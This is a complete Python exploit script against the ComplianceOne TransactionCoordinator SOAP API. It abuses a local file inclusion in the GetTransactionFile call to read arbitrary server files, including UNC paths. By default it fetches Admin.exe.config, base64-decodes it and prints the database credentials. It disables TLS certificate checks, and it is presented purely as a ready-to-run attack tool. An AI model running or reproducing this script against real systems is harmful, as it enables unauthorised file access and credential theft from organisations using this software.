import requests
import argparse
import logging
import base64
import xml.etree.ElementTree as ET

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser(add_help = True, description = "Exploit for ComplianceOne local file inclusion via TransactionCoordinator SOAP API.\nDefault target will extract and decode database credentials.")

parser.add_argument('-t', dest='TARGET', help="Target URL (e.g. http://127.0.0.1:8080)", type=str, required=True)
parser.add_argument("-v", "--verbose", dest='VERBOSE', help="Increase output verbosity", action="store_true", required=False)
parser.add_argument('-f', dest='FILE', help='Filename - can use explicit, relative, or UNC paths', type=str, required=False, default='S:\\Program Files (x86)\\ComplianceOne\\Admin.exe.config')
args = parser.parse_args()
base_url = args.TARGET
file = args.FILE
if args.VERBOSE: logging.basicConfig(level=logging.DEBUG)

target_url = base_url+"/XDDS_Lending/TKO_WS/TransactionCoordinator.asmx"
headers = {"Connection": "close", "SOAPAction": "WoltersKluwer.Expere.Dds/GetTransactionFile", "Content-Type": "text/xml;charset=UTF-8"}
data="""
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wol="WoltersKluwer.Expere.Dds">
    <soapenv:Body>
    <wol:GetTransactionFile>
        <wol:transactionID></wol:transactionID>
        <wol:filename>"""+file+"""</wol:filename>
    </wol:GetTransactionFile>
    </soapenv:Body>
</soapenv:Envelope>"""
r = requests.post(target_url, headers=headers, data=data, verify=False, timeout=60)
logging.debug(r.text)
if "Admin.exe.config" in file:
    splitresponse = r.text.split("<GetTransactionFileResult>")[1].split("</GetTransactionFileResult>")[0]
    logging.debug(splitresponse)

    decoded_string = base64.b64decode(splitresponse)
    logging.debug(decoded_string)

    connectionstring = decoded_string.split("========================================")[2]
    logging.debug(connectionstring)

    creds = connectionstring.split(";")
    print(creds[2])
    print(creds[3])
    print(creds[4])
else:
    splitresponse = r.text.split("<GetTransactionFileResult>")[1].split("</GetTransactionFileResult>")[0]
    logging.debug(splitresponse)

    decoded_string = base64.b64decode(splitresponse)
    print(decoded_string)
